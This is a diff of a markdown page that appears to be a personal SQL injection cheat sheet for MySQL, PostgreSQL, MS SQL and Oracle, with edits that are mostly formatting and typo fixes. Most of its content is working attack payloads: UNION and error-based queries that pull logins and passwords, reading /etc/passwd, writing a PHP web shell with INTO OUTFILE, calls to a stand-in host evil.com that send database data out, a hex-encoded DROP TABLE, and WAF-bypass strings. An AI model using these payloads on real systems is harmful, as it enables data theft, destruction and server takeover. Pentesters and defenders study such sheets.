@@ -1,7 +1,7 @@
 ---
 layout: page
 
-title: SQli
+title: SQLi
 
 category: infosec
 see_my_category_in_header: true
@@ -129,7 +129,8 @@ Comments
 <td markdown="1"> \>= 2000
 </td>
 <td markdown="1">
-no `information_schema`<br>
+no `information_schema`
+
 special table: `dual`
 </td>
 </tr> <!-- ======================================================================================================================================== -->
@@ -177,7 +178,9 @@ You have an error in your SQL syntax; check the manual that corresponds to your 
 Query failed: ERROR: syntax error at or near “'” at character 56 in /www/site/ test.php on line 121.
 </td>
 <td markdown="1">
-Microsoft SQL Native Client error ‘80040e14’ <br> Unclosed quotation mark after the character string
+Microsoft SQL Native Client error ‘80040e14’
+
+Unclosed quotation mark after the character string
 </td>
 <td markdown="1">
 ORA-00933: SQL command not properly ended
@@ -191,8 +194,10 @@ Handy functions
 <td markdown="1">
 `SUBSTRING (str, pos[, len])`
 `CONCAT (param1, param2, ...)`
-`IF (exp,true,false)` <br>
-[String functions](http://dev.mysql.com/doc/refman/5.7/en/string-functions.html#operator_sounds-like) <br>
+`IF (exp,true,false)`
+
+[String functions](http://dev.mysql.com/doc/refman/5.7/en/string-functions.html#operator_sounds-like)
+
 [Miscellaneous functions](http://dev.mysql.com/doc/refman/5.7/en/miscellaneous-functions.html)
 </td>
 <td markdown="1">
@@ -200,7 +205,7 @@ Handy functions
 </td>
 <td markdown="1">
 `if 1=1 select... else select ...;` - *`if` cann't be used inside `select`*
-<br>
+
 `case ... [when ... then ...]* else ... end`
 </td>
 <td markdown="1">
@@ -229,42 +234,37 @@ Handy functions
 
 1. `group by x` in MySQL will group results by x, even if final table will have other column y and some rows with identical x will have different y. MySQL will just select some random row for the final table. To the contrary, any other databases will not do so, they will throw error in such uncertain cituation.<br>&#20;
 
+
 1. MySQL @@version < 3
     
-    <br>
-
     - no subqueries `select (select ...)`
     - no `union`
 
-    <br>
 
-2. Reading files from mysql ***client*** (mysql protocol)
-
-    <br>
+1. Reading files from mysql ***client*** (mysql protocol)
 
     `LOAD DATA LOCAL INFILE '/etc/passwd'` (e.g. [mysql server for file reading](https://github.com/allyshka/Rogue-MySql-Server))
 
-    <br>
-
-3. MySQL variables
+1. MySQL variables
 
     <br>
-    
-    @@basedir, @@datadir, @@tmpdir <br>
 
-    @@version, @@version_compile_os, @@version_comment, @@version_compile_machine <br>
+    @@basedir, @@datadir, @@tmpdir
 
-    @@database <br>
+    @@version, @@version_compile_os, @@version_comment, @@version_compile_machine
 
-    @@log_error <br>
+    @@database
 
-    USER(), SYSTEM_USER(), SESSION_USER(), CURRENT_USER() <br>
+    @@log_error
+
+    USER(), SYSTEM_USER(), SESSION_USER(), CURRENT_USER()
 
     etc. (> 500)
 
-    <br>
 
-4. Back quotes means database and table. ```select * from `information_schema`.`shemata`;```
+1. Back quotes means database and table.
+
+    ```select * from `information_schema`.`shemata`;```
 
 <!--
 
@@ -319,15 +319,12 @@ Handy functions
 
     - `?id=1' limit 0 union select group_concat(schema_name) from information_schema.schemata -- -`
 
-    <br>
 
 - Concatenation column values into one cell
 
     - **`GROUP_CONCAT`** *(limit = 1024 symbols)*
     
         `select GROUP_CONCAT (concat_ws(0x3a,login,password)) from users;`
-
-        <br>
 
     - **`BENCHMARK`** as a cycle
 
@@ -348,31 +345,26 @@ select concat( concat(
 
         `select concat(@p:=0x20,(select count(*) from users where @p:=concat(@p,password,0x2C)), @p);`
 
-    <br>
 
 - bypass construction `str `**`LIKE`**` '$usr_input'`
     
     - `%` - means any string
     - `_` - means any symbol
 
-    <br>
 
 - injection after **`GROUP BY`** *(you can not use union)*
 
     - `select * from users where id=1 GROUP BY id limit 1 `**`PROCEDURE ANALYZE()`**`;`
     - `select * from users where id=1 GROUP BY `**`CASE`**` @@version like '5.7' `**`WHEN`**` 1 `**`THEN`**` post_id `**`ELSE`**` post_author `**`END`**
 
-    <br>
 
 - `UNION ALL` can be used against `DISTINCT`
 
-    <br>
 
 - getting executing query
 
     - `SELECT info FROM information_schema.`**`processlist`**`;`
 
-    <br>
 
 #### PostgreSQL
 
@@ -400,7 +392,6 @@ select concat( concat(
 
         `AND 1 = (SELECT TOP 1 table_name FROM information_schema.tables)`
 
-    <br>
 
 - <div><pre>UNION SELECT name FROM master..sysobjects WHERE xtype='U';
 'V' - for views 'U' - for user defined </pre></div>
@@ -442,7 +433,6 @@ Overal restriction for error length <= 512 *(mysys/my_error.c)*
     
         Error: `Operand should `**`contain 5 column(s)`**
 
-    <br>
 
 - Reading column names
 
@@ -452,30 +442,31 @@ Overal restriction for error length <= 512 *(mysys/my_error.c)*
 
     - `insert into users (id,username,passwd) values (if(1=1,NULL,'1'), '2','3')`
 
-        Error: `Column 'id' `**`cannot be null`** <br>
+        Error: `Column 'id' `**`cannot be null`**
+
         Values types can be guessed by changing the insertion values
 
     - **JOIN** Duplicate column name *(select can not work after `join` combined two tables into one with duplicate column names)*
 
         - `select * from (select * from users `**`JOIN`**` users a)b;`
     
-            `select * from (select * from users `**`JOIN`**` users a using (id))x;` - *will skip already known column id* <br>
+            `select * from (select * from users `**`JOIN`**` users a using (id))x;` - *will skip already known column id*
+
             Error: **`Duplicate column name`**` 'id'`
 
         - Same but without `join` keyword
 
             `select * from (select * from users, users as a)b;`
 
-    <br>
 
 - Reading values
 
     - Error based on **`COUNT(*)`**, **`FLOOR(RAND(0)*2)`** and **`GROUP BY`** *(Works because mysql insides executes this query by making two queries:  add count of x into temp table and if error (x value does not exist) then insert x value (second time x calculation) into table)*
 
-        `select COUNT(*), CONCAT(version(), FLOOR(RAND(0)*2) )x from users GROUP BY x;` <br>
+        `select COUNT(*), CONCAT(version(), FLOOR(RAND(0)*2) )x from users GROUP BY x;`
+
         *Does not work with `group_concat` instead of `version`*
 
-    <br>
 
     - `BIGINT UNSIGNED` error. *error length <= 452*
 
@@ -494,7 +485,6 @@ Overal restriction for error length <= 512 *(mysys/my_error.c)*
 
         `!(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x) - ~0` - will dump information_schema **values** in mysql version() == 5.5.5
 
-    <br>
 
 - Handy functions:
 
@@ -502,17 +492,16 @@ Overal restriction for error length <= 512 *(mysys/my_error.c)*
 
         `select name_const(version(), 1);`
 
-    <br>
 
 - Functions that expose its values when got wrong parameters:
 
     - updatexml
 
-        `select updatexml(1, concat('~', version()), 1);`<br>
+        `select updatexml(1, concat('~', version()), 1);`
 
     - extractvalue
 
-        `select extractvalue(1, concat('~', version()));`<br>
+        `select extractvalue(1, concat('~', version()));`
 
     - ST_LongFromGeoHash - *mysql >= 5.7.5*
 
@@ -535,7 +524,6 @@ Overal restriction for error length <= 512 *(mysys/my_error.c)*
 
         Error: **`Column`**` 'Users.password' `**`is invalid`**` ... it is not contained in either an aggregate function or the GROUP BY clause.`
 
-    <br>
 
 - Reading values
 
@@ -543,7 +531,6 @@ Overal restriction for error length <= 512 *(mysys/my_error.c)*
 
         `select convert(int, @@version);`
 
-    <br>
 
 - Some queries:
 
@@ -558,19 +545,21 @@ Overal restriction for error length <= 512 *(mysys/my_error.c)*
     - reading value through **XML ERRORS** (*space or symbol `@` will cut off value output in error msg*)
 
         `select XMLType ((select 'abcdef' from dual)) from dual;`
+
         Error: `... expected '<' instead of 'a' ...`
 
         <br>
 
         `select XMLType((select '<abcdef:root>' from dual)) from dual;`
+
         Error: `... namespace prefix "abcdef" is not declared ...`
 
         <br>
 
         `select XMLType((select '<:abcdef>' from dual)) from dual;`
+
         Error: `... Warning: invalid QName ":abcdef" (not a Name) ...`
 
-        <br>
 
     - **XML ERROR** *will return 107 symbols of database content*
         <pre>select * from table where id = 1 and (1) =
@@ -582,11 +571,11 @@ Overal restriction for error length <= 512 *(mysys/my_error.c)*
     chr(62)))
 from dual);</pre>
 
-    <br>        
 
-- Some queryis:
+- Some queries:
     
-    `select * from products where id_product=10 || UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) ) -- ` <br>&#20;
+    `select * from products where id_product=10 || UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) ) -- `
+
     Error: `ORA-292257: host SCOTT unknown`
 
 
@@ -607,7 +596,6 @@ from dual);</pre>
 
     `select * from news ORDER BY ( id * if (ascii (substring (version(),0,1) ) = 53, 1, -1));`
 
-    <br>
 
 - **`FIND_IN_SET`** to get more info from each query
 
@@ -706,33 +694,30 @@ from dual);</pre>
 
     - Check if we have file privileges
 
-        `select if (LOAD_FILE ('/etc/passwd') is not NULL, 1, 0)` <br>
+        `select if (LOAD_FILE ('/etc/passwd') is not NULL, 1, 0)`
+
         `?id=coalesce (length (load_file (0x2F6574632F706173737764)), 1)` - *coalesce returns first not null value from list*
 
-        <br>
 
     - **`LOAD_FILE`**
 
         `select LOAD_FILE ('/etc/passwd');`
 
-        <br>
 
     - **`INTO OUTFILE`**
 
-        `select * from table INTO OUTFILE '/path/to/shell.php' LINES TERMINATED BY "<?php system($_GET[k]);die();?>";` <br>
+        `select * from table INTO OUTFILE '/path/to/shell.php' LINES TERMINATED BY "<?php system($_GET[k]);die();?>";`
+
         `select * from table INTO OUTFILE '/path/to/shell.php' FIELDS TERMINATED BY '' optionally enclosed by "<?php system($_GET[k]);die();?>"`
 
-        <br>
     
     - **`LOAD DATA INFILE`**
 
         `LOAD DATA INFILE '/etc/passwd' into table db.users;`
 
-        <br>
 
     - **`LOAD DATA LOCAL INFILE`** - according to mysql protocol load file from the client machine
 
-    <br>
 
 - **internet connections**. *Config must have `FILE_PRIV=yes`*
 
@@ -747,7 +732,7 @@ from dual);</pre>
     - **XXE** - `updatexml` and `extractvalue`
 
         `select UPDATEXML('<!DOCTYPE hifi [<!ENTITY xxe SYSTEM "http://localhost:1234">]><a>&xxe;</a>', '/a', 2);` - *didn't managed to successfully execute this one*
-        <br>
+        
         `select EXTRACTVALUE('<!DOCTYPE hifi [<!ENTITY % xxe SYSTEM "http://localhost:1234"> %xxe;]><a>lol</a>', '/a');` - *didn't managed to successfully execute this one*
 
 #### PostgreSQL
@@ -771,7 +756,6 @@ from dual);</pre>
 
         `select * from OPENROWSET('SQLOLEDB', 'Network=DBMSSOCN; Address=evil.com; uid=my_username; pwd=mypassword', 'select user_password from users);`
 
-    <br>
 
 - **RCE** - *`exec` and stored procedure `xp_cmdshell` - must be activated*
 
@@ -806,7 +790,6 @@ EXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%\system32\cmd.exe /c';</pre>
     - **`UTL_INADDR.GET_HOST_ADDRESS`**
         `select UTL_INADDR.GET_HOST_ADDRESS('evil.com') from dual;`
 
-    <br>
 
 - Handy functions:
 
@@ -831,7 +814,7 @@ EXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%\system32\cmd.exe /c';</pre>
 
 [WAF Attack Methods](./waf.html#attack-methods)
 
-[Encoding special characters](./encodings.html#special-characters)
+[Encoding special characters](encodings.html#special-characters)
 
 [OWASP SQL injection bypassing WAF](https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF)
 
@@ -841,8 +824,6 @@ EXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%\system32\cmd.exe /c';</pre>
 
         `select(username)from[users];`
 
-        <br>
-
     - useless operations based on `like`, `substring`, ..., `~`, `!`, unary `+`, `-`, `@`
 
 - Declare some variables, which will break WAF regexps
@@ -850,9 +831,7 @@ EXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%\system32\cmd.exe /c';</pre>
 
 #### My SQL:
 
-- **hex** encoding
-    
-    `'/etc/passwd' -> 0x2F6574632F706173737764`
+- **hex** encoding `'/etc/passwd' -> 0x2F6574632F706173737764`
 
 - `union select` --> `uNioN SeLeCt`
 
@@ -860,49 +839,62 @@ EXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%\system32\cmd.exe /c';</pre>
 
 - `and` --> if (a, if (b, true, 0), 0)
 
-- comments `/*! select ... */`
-    <br>
+- comments `/*! select ... */`<br>&#20;
 
 - change syntax and sql query structure. **Synonyms**!
 
-    `substring (str, pos[, len])` vs `substring (str FROM pos [FOR len])` vs `mid (str, pos[, len])` vs `mid (str FROM pos [FOR len])` vs `left` vs `right` <br>
-    `convert (version (), binary)` vs  `convert (version () using latin1)` vs `cast (version () as binary)` <br>
-    `ascii`, `char`, `hex` <br>
-    `regexp`, `rlike`, `not regexp`, `not like` vs `locate (substr, str[, pos])` - *find* <br>
-    `if (exp, true, false)`, `ifnull`, `nullif`, `case ... [when ... then ...]* else ... end`, `expr BETWEEN min AND max` - *return 0 or 1* <br>
-    `concat (param1, param2, ...)`, `concat_ws (sep, param1, param2, ...)` - *with separator* <br>
+    `substring (str, pos[, len])` vs `substring (str FROM pos [FOR len])` vs `mid (str, pos[, len])` vs `mid (str FROM pos [FOR len])` vs `left` vs `right`
 
-    <br>
+    `convert (version (), binary)` vs  `convert (version () using latin1)` vs `cast (version () as binary)`
+
+    `ascii`, `char`, `hex`
+
+    `regexp`, `rlike`, `not regexp`, `not like` vs `locate (substr, str[, pos])` - *find*
+
+    `if (exp, true, false)`, `ifnull`, `nullif`, `case ... [when ... then ...]* else ... end`, `expr BETWEEN min AND max` - *return 0 or 1*
+
+    `concat (param1, param2, ...)`, `concat_ws (sep, param1, param2, ...)` - *with separator*
+
 
 - **Examples**
 
-    `/?id=1/*union*/union/*select*/select+1,2,3/*` <br>
-    `/?id=1+un/**/ion+sel/**/ect+1,2,3--` <br>
-    `/?id=1/**/union/*&id=*/select/*&id=*/pwd/*&id=*/from/*&id=*/users` <br>
+    `/?id=1/*union*/union/*select*/select+1,2,3/*`
+
+    `/?id=1+un/**/ion+sel/**/ect+1,2,3--`
+
+    `/?id=1/**/union/*&id=*/select/*&id=*/pwd/*&id=*/from/*&id=*/users`
+
     <br>
 
-    `Query("select * from table where a=".$_GET['a']." and b=".$_GET['b']." limit".$_GET['c']);` <br>
-    `/?a=1+union/*&b=*/select+1,pass/*&c=*/from+users--` <br>
+    `Query("select * from table where a=".$_GET['a']." and b=".$_GET['b']." limit".$_GET['c']);`
+
+    `/?a=1+union/*&b=*/select+1,pass/*&c=*/from+users--`
+
     <br>
 
-    no spaces, slashes, quotes and numeric operations: <br>
-    `?id=(1)and(1)=(0)union(select(null),group_concat(column_name),(null)from(information_schema.columns)where(table_name)=(0x7573657273))#` <br>
+    no spaces, slashes, quotes and numeric operations:
+
+    `?id=(1)and(1)=(0)union(select(null),group_concat(column_name),(null)from(information_schema.columns)where(table_name)=(0x7573657273))#`
+
     <br>
 
-    `where` alternative <br>
-    `?id=(0)union(select(table_schema),table_name,(0)from(information_schema.tables)having((table_schema)like('test')&&(table_name)!=('my_table_1')))#` <br>
+    `where` alternative
+
+    `?id=(0)union(select(table_schema),table_name,(0)from(information_schema.tables)having((table_schema)like('test')&&(table_name)!=('my_table_1')))#`
+
     <br>
 
-    bypassing commas: <br>
-    `select * from (select 1)x join (select 2)y join (select 3)z;` <br>
-    
-    <br>
+    bypassing commas:
+
+    `select * from (select 1)x join (select 2)y join (select 3)z;`
+
 
 #### MS SQL:
 
 - **hex** encoding, etc. **no quotes**
 
-    `DECLARE @S VARCHAR(4000) SET @S=CAST(0x44524f50205441424c4520544d505f44423b AS VARCHAR(4000)); EXEC (@S);` <br>
+    `DECLARE @S VARCHAR(4000) SET @S=CAST(0x44524f50205441424c4520544d505f44423b AS VARCHAR(4000)); EXEC (@S);`
+
     `SELECT * FROM Users WHERE username = CHAR(97) + CHAR(100) + CHAR(109) + CHAR(105) + CHAR(110);`
 
 - Symbols %01-%20, `!`, `+`, `-`, `.`, `\`, `~` are alowed as intermediary characters
@@ -913,7 +905,8 @@ EXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%\system32\cmd.exe /c';</pre>
 
 - names can be encoded
 
-    `SELECT 0x09120911091 FROM dual;` <br>
+    `SELECT 0x09120911091 FROM dual;`
+    
     `SELECT CHR(32)||CHR(92)||CHR(93) FROM dual;`
 
 </article>
